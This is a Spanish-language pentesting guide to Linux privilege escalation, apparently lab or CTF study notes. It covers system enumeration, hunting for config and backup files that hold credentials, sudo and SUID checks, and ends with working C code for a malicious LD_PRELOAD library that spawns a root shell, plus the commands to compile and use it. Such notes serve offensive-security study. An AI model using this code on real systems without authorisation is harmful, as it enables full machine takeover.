# Escalada de privilegios en Linux

Se definen en esta página las principales técnicas de escalada de privilegios en máquinas Linux.

Se supone siempre que acabamos de comprometer una máquina y tenemos acceso a ella con un usuario de bajos privilegios.

## Enumeración de la máquina comprometida.

Hay una serie de comandos que siempre debemos lanzar al comprometer una máquina.

Comenzamos.

### whoami, id, ifconfig, ip a

* El comando **whoami** nos dice que usuario somos.
* El comando **id**  nos dice que usuario somos, pero ademas nos muestra los grupos en los que estamos.
* El comando **ifconfig** nos dice la ip que tenemos. Si no coincide con la que hemos trabajado es que estamos en un contenedor.
* El comando **ip a** hace lo mismo que **ifconfig** cuando este no funciona. Depende de la versión de linux.

![](/.gitbook/assets/escal01.png)

### Datos del sistema. uname -a, cat /etc/lsb-release

* El comando **uname -a** nos devuelve la versión de Linux que se ejecuta. Si es antigua podemos buscar vulnerabilidades con **searchsploit**. 
* El comando **cat /etc/lsb-release** nos devuelve la información exacta de la distribución. Si es antigua podemos buscar vulnerabilidades con **searchsploit**. 

![](/.gitbook/assets/escal02.png)

## Técnicas rutinarias

### Buscar ficheros **config** o **backup**

Sobre todo si estamos en un directorio de aplicación php, podemos buscar por el patrón config. Es posible obtener donde se configura la aplicación con el usuario de base de datos.

```bash
# Desde el directorio actual
find . -name *config*
# todo el sistema
find / -name *config*
```

También se puede hacer lo mismo con la palabra buckup, buscando posibles zips.

## Revisar los permisos sudo

Si tenemos la contraseña del usuario, podemos ver si tiene permisos sudo con **sudo -l**. Podemos ver si nos podemos aprovechar de algún permiso sudo para escalar privilegios.

![](/.gitbook/assets/kio33.png)

## Buscar ficheros con permisos SUID

```bash
find / -perm -u=s -type f 2>/dev/null
find \-perm -4000 2>/dev/null
```

## Técnicas especificas.

### Sudo de ficheros binarios con la opción 

Si tenemos como opción en **sudo** la ejecución de un fichero binario y ademas tenemos la opción de enviar parametros en PRELOAD, ver la imagen:

![](/.gitbook/assets/sudo-preload.png)

Entonces podemos crearnos un módulo de preload malicioso. Creamos el fichero shell.c con el siguiente código c:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
```

Luego lo compilamos como **shell.so**:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
``` 

Y ya podemos ejecutar el binario como sudo cargando el módulo:

```bash
sudo LD_PRELOAD=/home/webdeveloper/shell.so /usr/bin/sky_backup_utility
``` 